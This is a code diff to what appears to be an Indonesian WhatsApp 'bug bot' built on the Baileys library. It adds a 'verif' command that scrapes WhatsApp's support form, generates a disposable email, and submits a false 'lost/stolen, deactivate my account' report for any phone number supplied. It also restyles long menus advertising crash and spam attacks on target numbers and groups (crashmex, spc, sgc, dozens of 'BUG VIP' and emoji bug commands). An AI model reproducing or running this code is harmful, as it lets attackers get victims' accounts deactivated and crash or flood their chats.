@@ -1518,6 +1518,45 @@ function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=fun
 }
 break
 //=================================================//
+case prefix+"verif": {
+  var axioss = require ("axios")
+  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let cookie = ntah.headers["set-cookie"].join("; ")
+let $ = cheerio.load(ntah.data)
+let $form = $("form");
+let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+let form = new URLSearchParams()
+form.append("jazoest", $form.find("input[name=jazoest]").val())
+form.append("lsd", $form.find("input[name=lsd]").val())
+form.append("step", "submit")
+form.append("country_selector", "ID")
+form.append("phone_number", q)
+form.append("email", email.data[0])
+form.append("email_confirm", email.data[0])
+form.append("platform", "ANDROID")
+form.append("your_message", "Perdido/roubado: desative minha conta")
+form.append("__user", "0")
+form.append("__a", "1")
+form.append("__csr", "")
+form.append("__req", "8")
+form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("dpr", "1")
+form.append("__ccg", "UNKNOWN")
+form.append("__rev", "1006630858")
+form.append("__comment_req", "0")
+let res = await axioss({
+  url,
+  method: "POST",
+  data: form,
+  headers: {
+    cookie
+  }
+})
+jansen.sendMessage(m.chat, { text: util.format(res.data)}, { quoted: m })
+}
+break
+//=================================================//
 case 'afk': {
 if (isBan) throw sticBanLu(from)
 let user = global.db.data.users[m.sender]
@@ -4874,42 +4913,42 @@ jansen.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushnam
 ° Baileys : 4.4.0
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐕𝐈𝐏✯ ݊⃟̥⃝̇݊⃟╾━━•
-┃𖠀⃟❍➢ Bugmenu  
-┃𖠀⃟❍➢ Mybug  
-┃𖠀⃟❍➢ Infobot  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Bugmenu  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Mybug  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Infobot  
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐕𝐈𝐏✯ ݊⃟̥⃝̇݊⃟╾━━•
-┃𖠀⃟❍➢❍ Menu_Auto ❍
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢❍ Menu_Auto ❍
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐕𝐈𝐏✯ ݊⃟̥⃝̇݊⃟╾━━•
-┃𖠀⃟❍➢ Autoketik on / off  
-┃𖠀⃟❍➢ Autovn on / off  
-┃𖠀⃟❍➢ Autoavailable on / off  
-┃𖠀⃟❍➢ Welcome on / off [ Crash ]  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Autoketik on / off  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Autovn on / off  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Autoavailable on / off  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Welcome on / off [ Crash ]  
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐕𝐈𝐏✯ ݊⃟̥⃝̇݊⃟╾━━•
-┃𖠀⃟❍➢❍ Menu Mods ❍
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢❍ Menu Mods ❍
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐕𝐈𝐏✯ ݊⃟̥⃝̇݊⃟╾━━•
-┃𖠀⃟❍➢ Scraperimage  
-┃𖠀⃟❍➢ Asupanmata  
-┃𖠀⃟❍➢ Scrapconvert  
-┃𖠀⃟❍➢ Nsfw  
-┃𖠀⃟❍➢ Soundbot  
-┃𖠀⃟❍➢ Funnmenu  
-┃𖠀⃟❍➢ Primbonmenu  
-┃𖠀⃟❍➢ Islamiyah  
-┃𖠀⃟❍➢ Voicechanger  
-┃𖠀⃟❍➢ Beritanews  
-┃𖠀⃟❍➢ Cmdmenu  
-┃𖠀⃟❍➢ Searchmenu  
-┃𖠀⃟❍➢ Groupmenu  
-┃𖠀⃟❍➢ Downloadmenu  
-┃𖠀⃟❍➢ Ownermenu  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Scraperimage  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Asupanmata  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Scrapconvert  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Nsfw  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Soundbot  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Funnmenu  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Primbonmenu  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Islamiyah  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Voicechanger  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Beritanews  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Cmdmenu  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Searchmenu  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Groupmenu  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Downloadmenu  
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ Ownermenu  
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 *NOTE*
@@ -4928,7 +4967,7 @@ thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg',
 }
 break
 //=================================================//
-case 'bugmenu': case 'mybug': {
+case 'bugmenu': case 'mybot': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 [ 🏴‍☠️ Aku Adalah Bot Jansen ]
@@ -4948,355 +4987,356 @@ BUG BOT VIP
 BY : ${botname}
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯SPECIAL✯ ݊⃟̥⃝̇݊⃟•
-┃𖠀⃟❍➢afk { kasih reactions }
-┃𖠀⃟❍➢jansenghoib [ on / off ]
-┃𖠀⃟❍➢jansenjagoan [ reply target ]
-┃𖠀⃟❍➢jansensange [ Harus Menjadi Admin ]
-┃𖠀⃟❍➢bugtiktok [ Link ] - Bug Sw
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢verif
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢afk { kasih reactions }
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenghoib [ on / off ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenjagoan [ reply target ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensange [ Harus Menjadi Admin ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bugtiktok [ Link ] - Bug Sw
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯TARGET✯ ݊⃟̥⃝̇݊⃟•
-┃𖠀⃟❍➢🔥 628xxx|5|5
-┃𖠀⃟❍➢jansenskuy 628x
-┃𖠀⃟❍➢crashmex 628xxx|5|5
-┃𖠀⃟❍➢spc 628x@s.whatsapp.net|10|10s
-┃𖠀⃟❍➢cpc 628x@s.whatsapp.net|10|10s
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🔥 628xxx|5|5
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenskuy 628x
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashmex 628xxx|5|5
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢spc 628x@s.whatsapp.net|10|10s
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cpc 628x@s.whatsapp.net|10|10s
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 Ketik > m.chat ( di group dulu )
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯GROUP✯ ݊⃟̥⃝̇݊⃟•
-┃𖠀⃟❍➢gasjansen 112674448x
-┃𖠀⃟❍➢sgc 1237891x@g.us|10|10s
-┃𖠀⃟❍➢cgc 1237891x@g.us|10|10s
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢gasjansen 112674448x
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢sgc 1237891x@g.us|10|10s
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cgc 1237891x@g.us|10|10s
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯BUG EMOJI✯ ݊⃟̥⃝̇݊⃟•
-┃𖠀⃟❍➢💀 [ jumlah ]
-┃𖠀⃟❍➢👽 [ jumlah ]
-┃𖠀⃟❍➢☠️ [ jumlah ]
-┃𖠀⃟❍➢️👾 [ jumlah ]
-┃𖠀⃟❍➢🪐 [ jumlah ]
-┃𖠀⃟❍➢🦴 [ jumlah ]
-┃𖠀⃟❍➢☝ [ jumlah ]
-┃𖠀⃟❍➢👻 [ jumlah ]
-┃𖠀⃟❍➢🦖 [ jumlah ]
-┃𖠀⃟❍➢🦕 [ jumlah ]
-┃𖠀⃟❍➢👿 [ jumlah ]
-┃𖠀⃟❍➢🐉 [ jumlah ]
-┃𖠀⃟❍➢⚡ [ jumlah ]
-┃𖠀⃟❍➢💥 [ jumlah ]
-┃𖠀⃟❍➢🔥 [ jumlah ]
-┃𖠀⃟❍➢🌪️ [ jumlah ]
-┃𖠀⃟❍➢🍂 [ jumlah ]
-┃𖠀⃟❍➢🍃 [ jumlah ]
-┃𖠀⃟❍➢🌴 [ jumlah ]
-┃𖠀⃟❍➢🌿 [ jumlah ]
-┃𖠀⃟❍➢🍀 [ jumlah ]
-┃𖠀⃟❍➢🪵 [ jumlah ]
-┃𖠀⃟❍➢🦥 [ jumlah ]
-┃𖠀⃟❍➢🌳 [ jumlah ]
-┃𖠀⃟❍➢🍁 [ jumlah ]
-┃𖠀⃟❍➢🎋 [ jumlah ]
-┃𖠀⃟❍➢🥜 [ jumlah ]
-┃𖠀⃟❍➢🌰 [ jumlah ]
-┃𖠀⃟❍➢🥔 [ jumlah ]
-┃𖠀⃟❍➢🧄 [ jumlah ]
-┃𖠀⃟❍➢🍆 [ jumlah ]
-┃𖠀⃟❍➢🥑 [ jumlah ]
-┃𖠀⃟❍➢🫑 [ jumlah ]
-┃𖠀⃟❍➢🥬 [ jumlah ]
-┃𖠀⃟❍➢🥒 [ jumlah ]
-┃𖠀⃟❍➢🥦 [ jumlah ]
-┃𖠀⃟❍➢🌽 [ jumlah ]
-┃𖠀⃟❍➢🧅 [ jumlah ]
-┃𖠀⃟❍➢🍠 [ jumlah ]
-┃𖠀⃟❍➢🥕 [ jumlah ]
-┃𖠀⃟❍➢🌶️ [ jumlah ]
-┃𖠀⃟❍➢🍅 [ jumlah ]
-┃𖠀⃟❍➢🥥 [ jumlah ]
-┃𖠀⃟❍➢🍇 [ jumlah ]
-┃𖠀⃟❍➢🫐 [ jumlah ]
-┃𖠀⃟❍➢🫒 [ jumlah ]
-┃𖠀⃟❍➢🥝 [ jumlah ]
-┃𖠀⃟❍➢🍐 [ jumlah ]
-┃𖠀⃟❍➢🍏 [ jumlah ]
-┃𖠀⃟❍➢🍈 [ jumlah ]
-┃𖠀⃟❍➢🍋 [ jumlah ]
-┃𖠀⃟❍➢🍌 [ jumlah ]
-┃𖠀⃟❍➢🍍 [ jumlah ]
-┃𖠀⃟❍➢🥭 [ jumlah ]
-┃𖠀⃟❍➢🍊 [ jumlah ]
-┃𖠀⃟❍➢🍑 [ jumlah ]
-┃𖠀⃟❍➢🍉 [ jumlah ]
-┃𖠀⃟❍➢🍎 [ jumlah ]
-┃𖠀⃟❍➢🍒 [ jumlah ]
-┃𖠀⃟❍➢🍓 [ jumlah ]
-┃𖠀⃟❍➢🥀 [ jumlah ]
-┃𖠀⃟❍➢🐍 [ jumlah ]
-┃𖠀⃟❍➢🦂 [ jumlah ]
-┃𖠀⃟❍➢🌷 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢💀 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢👽 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢☠️ [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢️👾 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🪐 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🦴 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢☝ [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢👻 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🦖 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🦕 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢👿 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🐉 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢⚡ [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢💥 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🔥 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌪️ [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍂 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍃 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌴 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌿 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍀 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🪵 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🦥 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌳 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍁 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🎋 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥜 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌰 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥔 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🧄 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍆 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥑 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🫑 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥬 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥒 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥦 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌽 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🧅 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍠 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥕 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌶️ [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍅 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥥 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍇 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🫐 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🫒 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥝 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍐 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍏 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍈 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍋 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍌 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍍 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥭 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍊 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍑 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍉 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍎 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍒 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🍓 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🥀 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🐍 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🦂 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢🌷 [ jumlah ]
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯BUG VIP✯ ݊⃟̥⃝̇݊⃟•
-┃𖠀⃟❍➢jansen1 [ jumlah ]
-┃𖠀⃟❍➢jansen2 [ jumlah ]
-┃𖠀⃟❍➢jansen3 [ jumlah ]
-┃𖠀⃟❍➢jansen4 [ jumlah ]
-┃𖠀⃟❍➢jansen5 [ jumlah ]
-┃𖠀⃟❍➢jansen6 [ jumlah ]
-┃𖠀⃟❍➢jansen7 [ jumlah ]
-┃𖠀⃟❍➢jansen8 [ jumlah ]
-┃𖠀⃟❍➢jansen9 [ jumlah ]
-┃𖠀⃟❍➢jansen10 [ jumlah ]
-┃𖠀⃟❍➢jansen11 [ jumlah ]
-┃𖠀⃟❍➢jansen12 [ jumlah ]
-┃𖠀⃟❍➢jansen13 [ jumlah ]
-┃𖠀⃟❍➢jansen14 [ jumlah ]
-┃𖠀⃟❍➢jansen15 [ jumlah ]
-┃𖠀⃟❍➢jansen16 [ jumlah ]
-┃𖠀⃟❍➢jansen17 [ jumlah ]
-┃𖠀⃟❍➢jansen18 [ jumlah ]
-┃𖠀⃟❍➢jansen19 [ jumlah ]
-┃𖠀⃟❍➢jansen20 [ jumlah ]
-┃𖠀⃟❍➢jansen21 [ jumlah ]
-┃𖠀⃟❍➢jansen22 [ jumlah ]
-┃𖠀⃟❍➢jansen23 [ jumlah ]
-┃𖠀⃟❍➢jansen24 [ jumlah ]
-┃𖠀⃟❍➢jansen25 [ jumlah ]
-┃𖠀⃟❍➢jansen26 [ jumlah ]
-┃𖠀⃟❍➢jansen27 [ jumlah ]
-┃𖠀⃟❍➢jansen28 [ jumlah ]
-┃𖠀⃟❍➢jansen29 [ jumlah ]
-┃𖠀⃟❍➢jansen30 [ jumlah ]
-┃𖠀⃟❍➢jansen31 [ jumlah ]
-┃𖠀⃟❍➢jansen32 [ jumlah ]
-┃𖠀⃟❍➢jansen33 [ jumlah ]
-┃𖠀⃟❍➢jansen34 [ jumlah ]
-┃𖠀⃟❍➢jansen35 [ jumlah ]
-┃𖠀⃟❍➢jansen36 [ jumlah ]
-┃𖠀⃟❍➢jansen37 [ jumlah ]
-┃𖠀⃟❍➢jansen38 [ jumlah ]
-┃𖠀⃟❍➢jansen39 [ jumlah ]
-┃𖠀⃟❍➢jansen40 [ jumlah ]
-┃𖠀⃟❍➢jansen41 [ jumlah ]
-┃𖠀⃟❍➢jansen42 [ jumlah ]
-┃𖠀⃟❍➢jansen43 [ jumlah ]
-┃𖠀⃟❍➢jansen44 [ jumlah ]
-┃𖠀⃟❍➢jansen45 [ jumlah ]
-┃𖠀⃟❍➢jansen46 [ jumlah ]
-┃𖠀⃟❍➢jansen47 [ jumlah ]
-┃𖠀⃟❍➢jansen48 [ jumlah ]
-┃𖠀⃟❍➢jansen49 [ jumlah ]
-┃𖠀⃟❍➢jansen50 [ jumlah ]
-┃𖠀⃟❍➢jansen51 [ jumlah ]
-┃𖠀⃟❍➢jansen52 [ jumlah ]
-┃𖠀⃟❍➢jansen53 [ jumlah ]
-┃𖠀⃟❍➢jansen54 [ jumlah ]
-┃𖠀⃟❍➢jansen55 [ jumlah ]
-┃𖠀⃟❍➢jansen56 [ jumlah ]
-┃𖠀⃟❍➢jansen57 [ jumlah ]
-┃𖠀⃟❍➢jansen58 [ jumlah ]
-┃𖠀⃟❍➢jansen59 [ jumlah ]
-┃𖠀⃟❍➢jansen60 [ jumlah ]
-┃𖠀⃟❍➢okemex [ jumlah ]
-┃𖠀⃟❍➢mexcrot [ jumlah ]
-┃𖠀⃟❍➢jansennih [ jumlah ]
-┃𖠀⃟❍➢ampunsuhu [ jumlah ]
-┃𖠀⃟❍➢mexdemam [ jumlah ]
-┃𖠀⃟❍➢ahyangbetul [ jumlah ]
-┃𖠀⃟❍➢buttonkematian [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen1 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen2 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen3 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen4 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen5 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen6 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen7 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen8 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen9 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen10 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen11 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen12 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen13 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen14 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen15 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen16 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen17 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen18 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen19 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen20 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen21 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen22 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen23 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen24 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen25 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen26 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen27 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen28 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen29 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen30 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen31 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen32 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen33 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen34 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen35 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen36 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen37 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen38 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen39 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen40 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen41 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen42 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen43 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen44 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen45 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen46 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen47 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen48 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen49 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen50 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen51 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen52 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen53 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen54 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen55 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen56 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen57 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen58 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen59 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansen60 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢okemex [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢mexcrot [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansennih [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ampunsuhu [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢mexdemam [ jumlah ]
